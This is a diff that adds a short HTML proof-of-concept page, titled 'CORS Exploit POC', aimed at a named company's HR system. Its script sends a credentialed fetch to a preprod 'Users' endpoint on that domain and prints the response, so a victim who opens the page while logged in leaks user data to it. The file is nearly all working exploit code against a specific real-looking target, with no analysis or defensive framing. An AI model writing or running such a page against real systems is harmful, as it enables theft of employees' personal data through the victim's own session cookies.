@@ -1,0 +1,28 @@
+<!-- Save this as cors-poc.html -->
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS PoC</title>
+  </head>
+  <body>
+    <h2>CORS Exploit POC</h2>
+    <button onclick="exploit()">Exploit</button>
+    <pre id="result"></pre>
+
+    <script>
+      function exploit() {
+        fetch("https://hrconnectsit.reliancenipponlife.com/RLIFEHRMS_PREPROD/Users", {
+          method: "GET",
+          credentials: "include"  // Includes cookies in the request
+        })
+        .then(response => response.text())
+        .then(data => {
+          document.getElementById('result').innerText = data;
+        })
+        .catch(error => {
+          document.getElementById('result').innerText = "Error: " + error;
+        });
+      }
+    </script>
+  </body>
+</html>
